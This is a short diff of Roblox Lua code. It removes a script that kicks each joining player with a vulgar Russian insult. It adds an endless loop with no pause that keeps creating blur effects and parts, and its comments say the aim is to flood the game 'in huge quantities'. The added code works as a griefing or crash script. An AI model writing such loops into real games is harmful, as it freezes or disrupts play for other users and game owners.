@@ -1,3 +1,8 @@
-game.Players.PlayerAdded:Connect(function(player)
-    player:Kick("Ты пиздюк.")
-end)
+while true do
+    -- Создаем Blur или другие эффекты в огромном количестве
+    local blur = Instance.new("BlurEffect", game.Lighting)
+    blur.Size = 56
+    -- Спавним части в Workspace (только для этого игрока)
+    Instance.new("Part", workspace)
+end
+
